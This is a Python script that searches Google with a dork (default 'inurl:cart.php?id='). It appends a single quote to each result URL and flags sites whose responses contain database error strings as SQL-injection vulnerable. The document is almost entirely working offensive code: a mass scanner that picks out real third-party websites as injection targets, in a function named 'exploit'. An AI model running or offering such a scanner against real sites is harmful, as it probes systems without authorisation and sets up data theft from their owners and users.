#!/usr/bin/python3

import sys
import re
import requests
from googlesearch import search

errors = {
    'MySQL': 'error in your SQL syntax',
    'MiscError': 'mysql_fetch',
    'MiscError2': 'num_rows',
    'Oracle': 'ORA-01756',
    'JDBC_CFM': 'Error Executing Database Query',
    'JDBC_CFM2': 'SQLServer JDBC Driver',
    'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
    'MSSQL_Uqm': 'Unclosed quotation mark',
    'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
    'MS-Access_JETdb': 'Microsoft JET Database',
    'Error Occurred While Processing Request': 'Error Occurred While Processing Request',
    'Server Error': 'Server Error',
    'Microsoft OLE DB Provider for ODBC Drivers error': 'Microsoft OLE DB Provider for ODBC Drivers error',
    'Invalid Querystring': 'Invalid Querystring',
    'OLE DB Provider for ODBC': 'OLE DB Provider for ODBC',
    'VBScript Runtime': 'VBScript Runtime',
    'ADODB.Field': 'ADODB.Field',
    'BOF or EOF': 'BOF or EOF',
    'ADODB.Command': 'ADODB.Command',
    'JET Database': 'JET Database',
    'mysql_fetch_array()': 'mysql_fetch_array()',
    'Syntax error': 'Syntax error',
    'mysql_numrows()': 'mysql_numrows()',
    'GetArray()': 'GetArray()',
    'FetchRow()': 'FetchRow()',
    'Input string was not in a correct format': 'Input string was not in a correct format',
    'Not found': 'Not found'
}

def exploit(dork, total_page):
    user_agent = {"User-agent": "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"}
    count = 0

    for result in search(dork):
        if count >= int(total_page):
            break
        target_url = result + "'"
        try:
            response = requests.get(target_url, headers=user_agent)
            for error_type, error_message in errors.items():
                if re.search(error_message, response.text):
                    print(f"\033[41m\033[30mVULN\033[40m\033[37m {result}")
                    print(f"Vulnerability Type: \033[31m{error_type}\033[37m")
                    break
        except requests.exceptions.RequestException:
            print(f"Error accessing {target_url}")
        count += 1

def main():
    while True:
        dork = input("[?] Dork: [default: inurl:cart.php?id=]  ") or "inurl:cart.php?id="
        total_page = input("[?] Total pages to search:  ")
        if total_page.isdigit():
            exploit(dork, total_page)
        else:
            print("[!] Please provide a valid number of pages.")

if __name__ == "__main__":
    try:
        main()
    except ImportError:
        print("[!] Required modules are not installed. Run 'pip3 install -r requirements.txt'.")
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()